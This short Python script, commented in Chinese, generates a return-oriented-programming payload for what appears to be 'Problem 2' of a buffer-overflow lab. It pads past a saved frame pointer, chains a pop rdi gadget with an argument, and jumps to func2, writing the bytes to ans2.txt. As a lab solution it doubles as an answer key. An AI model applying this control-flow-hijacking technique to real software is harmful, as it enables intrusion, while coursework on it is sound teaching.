import struct

# 辅助函数：将 64 位地址转为小端字节流
def p64(addr):
    return struct.pack("<Q", addr)

# 1. 填充 (8字节 buffer + 8字节 saved rbp)
padding = b"A" * 16

# 2. pop_rdi gadget 的地址
# 这里我们直接跳到 pop rdi 那条指令的位置
# 查看反汇编: pop_rdi 函数开始于 0x4012BB, pop rdi 指令在 0x4012C7
pop_rdi_addr = 0x4012C7 

# 3. 我们想要传给 func2 的参数值 (x = 0x3F8)
arg_x = 0x3F8

# 4. func2 的起始地址
func2_addr = 0x401216

# 拼接 Payload
payload = padding + p64(pop_rdi_addr) + p64(arg_x) + p64(func2_addr)

# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Problem 2 Payload 已生成至 ans2.txt")